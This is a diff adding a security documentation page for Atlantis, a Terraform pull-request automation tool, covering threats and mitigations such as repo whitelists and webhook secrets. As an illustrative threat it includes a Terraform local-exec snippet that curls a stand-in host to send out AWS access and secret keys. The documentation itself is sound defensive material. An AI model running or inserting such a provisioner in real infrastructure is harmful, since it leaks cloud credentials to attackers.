@@ -1,0 +1,37 @@
+# Security
+Because you usually run Atlantis on a server with credentials that allow access to your infrastructure it's important that you deploy Atlantis securely.
+
+Atlantis could be exploited by
+* Running `terraform apply` on a malicious Terraform file with [local-exec](https://www.terraform.io/docs/provisioners/local-exec.html)
+```tf
+resource "null_resource" "null" {
+  provisioner "local-exec" {
+    command = "curl https://cred-stealer.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
+  }
+}
+```
+* Running malicious hook commands specified in an `atlantis.yaml` file.
+* Someone adding `atlantis plan/apply` comments on your valid pull requests causing terraform to run when you don't want it to.
+
+## Mitigations
+### Don't Use On Public Repos
+Because anyone can comment on public pull requests, even with all the security mitigations available, it's still dangerous to run Atlantis on public repos until Atlantis gets an authentication system.
+
+### Don't Use `--allow-fork-prs`
+If you're running on a public repo (which isn't recommended, see above) you shouldn't set `--allow-fork-prs` (defaults to false)
+because anyone can open up a pull request from their fork to your repo.
+
+### `--repo-whitelist`
+Atlantis requires you to specify a whitelist of repositories it will accept webhooks from via the `--repo-whitelist` flag.
+For example:
+* Specific repositories: `--repo-whitelist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
+* Your whole organization: `--repo-whitelist=github.com/runatlantis/*`
+* Every repository in your GitHub Enterprise install: `--repo-whitelist=github.yourcompany.com/*`
+* All repositories: `--repo-whitelist=*`. Useful for when you're in a protected network but dangerous without also setting a webhook secret.
+
+This flag ensures your Atlantis install isn't being used with repositories you don't control. See `atlantis server --help` for more details.
+
+### Webhook Secrets
+Atlantis should be run with Webhook secrets set via the `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` environment variables.
+Even with the `--repo-whitelist` flag set, without a webhook secret, attackers could make requests to Atlantis posing as a repository that is whitelisted.
+Webhook secrets ensure that the webhook requests are actually coming from your VCS provider (GitHub or GitLab).
